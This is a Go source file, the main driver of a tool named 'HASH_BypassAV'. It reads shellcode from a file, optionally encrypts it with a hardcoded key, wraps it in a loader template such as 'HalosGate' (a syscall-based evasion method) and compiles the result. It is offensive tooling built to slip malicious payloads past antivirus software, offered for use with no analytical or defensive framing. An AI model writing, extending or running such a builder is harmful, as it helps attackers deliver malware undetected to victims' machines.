package main

import (
	"HASH_BypassAV/build"
	"HASH_BypassAV/encrypt"
	"HASH_BypassAV/parser"
	"encoding/hex"
	"flag"
	"strings"
)

func main() {

	var (
		c_2_shellcode  bool
		shellcode_path string
		module         string
		enc            string
		key            string
	)

	flag.StringVar(&shellcode_path, "s", "shellcode.txt", "")
	flag.BoolVar(&c_2_shellcode, "c", false, "")
	flag.StringVar(&module, "m", "HalosGate", "")
	flag.StringVar(&enc, "e", "0", "")
	flag.StringVar(&key, "k", "#HvL%$o0oNNoOZnk#o2qbqCeQB13XeIR", "")
	flag.Parse()

	var shellcode, code string

	if c_2_shellcode {
		//code = parser.OriginShellCode(shellcode_path)
		shellcode = parser.ParseShellCode(shellcode_path)
	} else {
		shellcode = hex.EncodeToString(parser.OriginShellCode(shellcode_path))
	}
	if enc != "0" {
		enc = strings.ToUpper(enc)
		ss, ok := encrypt.EncryptShellcode(shellcode, enc, key)
		if !ok {
			return
		}
		shellcode = hex.EncodeToString(ss)
		code = parser.GetFinalCode(module, shellcode)
		code = encrypt.DecryptReplace(code, enc, key)
	} else {
		code = parser.GetFinalCode(module, shellcode)
	}

	build.Build(code, module)
}
